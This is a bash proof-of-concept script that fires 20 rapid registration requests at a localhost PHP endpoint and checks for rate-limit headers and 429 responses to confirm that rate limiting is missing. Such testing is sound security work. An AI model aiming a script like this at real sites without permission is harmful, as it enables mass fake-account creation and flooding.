#!/bin/bash

# POC: Missing Rate Limiting on Registration Endpoint
# This script demonstrates that the registration endpoint accepts unlimited rapid requests
# without any rate limiting, throttling, or account creation delays

TARGET_URL="http://localhost:8080/api/register.php"
NUM_REQUESTS=20
TIMING_FILE="/tmp/registration_timing.txt"

echo "[*] Testing Rate Limiting on Registration Endpoint"
echo "[*] Target: $TARGET_URL"
echo "[*] Sending $NUM_REQUESTS rapid registration requests..."
echo ""

# Clear timing file
> "$TIMING_FILE"

# Track successful requests
SUCCESS_COUNT=0
FAILED_COUNT=0

# Send rapid registration requests
for i in $(seq 1 $NUM_REQUESTS); do
    # Generate unique email and username for each request
    UNIQUE_ID=$(date +%s%N | md5sum | cut -c1-8)
    EMAIL="test_${UNIQUE_ID}@example.com"
    USERNAME="user_${UNIQUE_ID}"
    PASSWORD="password123"
    
    # Record start time
    START_TIME=$(date +%s%N)
    
    # Send registration request
    RESPONSE=$(curl -s -w "\n%{http_code}" -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=${USERNAME}&email=${EMAIL}&password=${PASSWORD}" \
        2>&1)
    
    # Record end time
    END_TIME=$(date +%s%N)
    ELAPSED_MS=$(( (END_TIME - START_TIME) / 1000000 ))
    
    # Parse response
    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
    BODY=$(echo "$RESPONSE" | sed '$d')
    
    # Check if request was successful
    if [[ "$HTTP_CODE" == "200" ]]; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
        echo "[+] Request $i: HTTP $HTTP_CODE - Success (${ELAPSED_MS}ms) - $EMAIL"
    else
        FAILED_COUNT=$((FAILED_COUNT + 1))
        echo "[-] Request $i: HTTP $HTTP_CODE - Failed (${ELAPSED_MS}ms)"
    fi
    
    # Log timing
    echo "$i,$HTTP_CODE,$ELAPSED_MS" >> "$TIMING_FILE"
done

echo ""
echo "========== RESULTS =========="
echo "Total Requests: $NUM_REQUESTS"
echo "Successful: $SUCCESS_COUNT"
echo "Failed: $FAILED_COUNT"
echo ""

# Check for rate limit headers in the last response
echo "[*] Checking for Rate Limiting Headers..."
LAST_RESPONSE=$(curl -s -i -X POST "$TARGET_URL" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "username=ratelimit_test&email=ratelimit_test@example.com&password=password123" \
    2>&1)

if echo "$LAST_RESPONSE" | grep -qi "x-ratelimit"; then
    echo "[+] Rate limiting headers detected:"
    echo "$LAST_RESPONSE" | grep -i "x-ratelimit"
else
    echo "[-] NO rate limiting headers found in responses"
fi

if echo "$LAST_RESPONSE" | grep -qi "retry-after"; then
    echo "[+] Retry-After header detected"
else
    echo "[-] NO Retry-After header found"
fi

if echo "$LAST_RESPONSE" | grep -qi "429"; then
    echo "[+] HTTP 429 (Too Many Requests) status detected"
else
    echo "[-] NO HTTP 429 responses detected"
fi

echo ""
echo "========== VULNERABILITY CONFIRMED =========="
if [ $SUCCESS_COUNT -ge 15 ]; then
    echo "[CRITICAL] Missing rate limiting on registration endpoint!"
    echo "Successfully created $SUCCESS_COUNT accounts in rapid succession."
    echo "Endpoint is vulnerable to:"
    echo "  - Account enumeration attacks"
    echo "  - Brute force account creation"
    echo "  - Resource exhaustion/DoS"
    echo "  - Email flooding"
    exit 0
else
    echo "[INFO] Rate limiting may be in place, but results are inconclusive"
    exit 1
fi